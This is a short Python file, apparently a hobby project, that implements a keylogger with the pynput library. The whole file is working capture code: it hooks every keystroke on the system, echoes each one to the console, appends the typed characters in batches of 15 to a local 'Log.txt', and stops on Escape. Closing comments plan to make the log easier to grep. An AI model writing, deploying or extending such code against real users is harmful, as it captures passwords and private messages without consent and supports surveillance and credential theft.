# Imports
from typing import List
import pynput
from pynput.keyboard import Key, Listener

count = 0 # count is for an update, for every 'N' Keys pressed write to file
keys = [] # NOTE: This should not be any bigger than it needs to be 

def Key_Pressed(key):

    # Key pressed Record Function
    global keys, count

    keys.append(key) # append key to keys 
    count += 1 # count is incremented
    print("{} Was Pressed".format(key)) # simple output showing Key Pressed
        
    if count >= 15: # every 15 keys the file 'Log.txt' is written too
        # perform resets and write to file
        count = 0
        writeToFile(keys)
        keys = []

def writeToFile(keys):
    try:
        # write to the text file for Output
        with open("Log.txt", "a") as fileOutput:
            for key in keys: # get individual keys and write them to the file
                # every time space key is pressed implement that in the output
                remove_Quotes = str(key).replace("'", "") # removes Quotations for a More readable Output
                if remove_Quotes.find("space") > 0:
                    fileOutput.write("\n")
                
                elif remove_Quotes.find("Key") == -1:
                    fileOutput.write(remove_Quotes)

    except Exception as ex:
        raise ex

def Key_Released(key):
    # Key release Record Function
    if key == Key.esc: # if Escape is Pressed Break out of the Loop
        return False

try:
    with Listener(on_press = Key_Pressed, on_release = Key_Released) as Key_listener:
        Key_listener.join() 

except KeyboardInterrupt:
    print("ERROR: Logger was interuppted, Exiting...")

# TO DO LIST:
# When a word is removed, Persay the person messes up and has to retype the Message
# It does not write and Re-appends the file with an Empty line, this bug will be fixed soon

# File format, Make the file simply more 'Grepable'